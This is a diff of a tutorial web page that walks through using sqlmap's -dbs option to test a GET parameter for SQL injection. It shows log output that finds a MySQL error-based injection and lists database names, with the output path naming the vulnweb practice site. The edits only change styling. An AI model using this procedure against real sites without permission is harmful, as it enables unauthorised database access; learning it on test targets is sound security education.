@@ -236,30 +236,30 @@ So, in our case, the command will be:<br><br>
 We added the -dbs option so that the program not only tests for vulnerabilities but also displays, in case the site is vulnerable to SQL Injection, the names of the databases. Once this command is entered, sqlmap will begin testing different combinations (payloads). If it discovers that the site is vulnerable, it will inform us of this.<br><br>
 
 <div class="code-box2">[11:08:00] [INFO] testing connection to the target URL
-[11:08:01] [INFO] testing if the target URL content is stable
-[11:08:01] [INFO] target URL content is stable
-[11:08:01] [INFO] testing if GET parameter 'id' is dynamic
-[11:08:01] [INFO] GET parameter 'id' appears to be dynamic
+[11:08:01] [<span class="username">INFO</span>] testing if the target URL content is stable
+[11:08:01] [<span class="username">INFO</span>] target URL content is stable
+[11:08:01] [<span class="username">INFO</span>] testing if GET parameter 'id' is dynamic
+[11:08:01] [<span class="username">INFO</span>] GET parameter 'id' appears to be dynamic
 [11:08:02] [WARNING] heuristic (basic) test shows that GET parameter 'id' might not be injectable
-[11:08:02] [INFO] testing for SQL injection on GET parameter 'id'
-[11:08:02] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
-[11:08:05] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
-[11:08:05] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
-[11:08:15] [INFO] GET parameter 'id' is 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)' injectable
+[11:08:02] [<span class="username">INFO</span>] testing for SQL injection on GET parameter 'id'
+[11:08:02] [<span class="username">INFO</span>] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[11:08:05] [<span class="username">INFO</span>] testing 'Boolean-based blind - Parameter replace (original value)'
+[11:08:05] [<span class="username">INFO</span>] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+[11:08:15] [<span class="username">INFO</span>] GET parameter 'id' is 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)' injectable
 it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n]</div><br>
 
 In the end, it will display the names of the databases, showing them with a [*] in front.<br><br>
 
-<div class="code-box2">[11:08:25] [INFO] the back-end DBMS is MySQL
+<div class="code-box2">[11:08:25] [<span class="username">INFO</span>] the back-end DBMS is MySQL
 web server operating system: Linux Ubuntu
 web application technology: PHP 5.6.40, Nginx 1.19.0
 back-end DBMS: MySQL >= 5.6
-[11:09:39] [INFO] fetching database names
+[11:09:39] [<span class="username">INFO</span>] fetching database names
 available databases [2]:
 [*] mywebsite_db
 [*] information_schema
 
-[11:09:41] [INFO] fetched data logged to text files under '/home/userland/.local/share/sqlmap/output/testphp.vulnweb.com
+[11:09:41] [<span class="username">INFO</span>] fetched data logged to text files under '/home/userland/.local/share/sqlmap/output/testphp.vulnweb.com
 
 <span class="username">andrew@local:~$</span></div>
 
